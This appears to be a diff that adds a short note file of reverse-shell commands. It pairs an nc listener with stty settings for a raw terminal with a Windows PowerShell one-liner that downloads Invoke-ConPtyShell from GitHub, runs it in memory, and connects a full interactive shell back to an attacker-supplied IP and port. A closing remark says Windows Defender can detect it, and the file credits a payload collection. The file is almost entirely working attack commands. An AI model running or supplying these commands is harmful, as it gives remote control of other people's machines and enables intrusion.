@@ -1,0 +1,9 @@
+Server:
+stty raw -echo; (stty size; cat) | nc -lvnp (your port) -s (your ip address)
+
+windows client:
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (your ip address) (your port)
+
+
+note:"it not hidden and can be noticed by windows defender."
+based to https://github.com/swisskyrepo/PayloadsAllTheThings
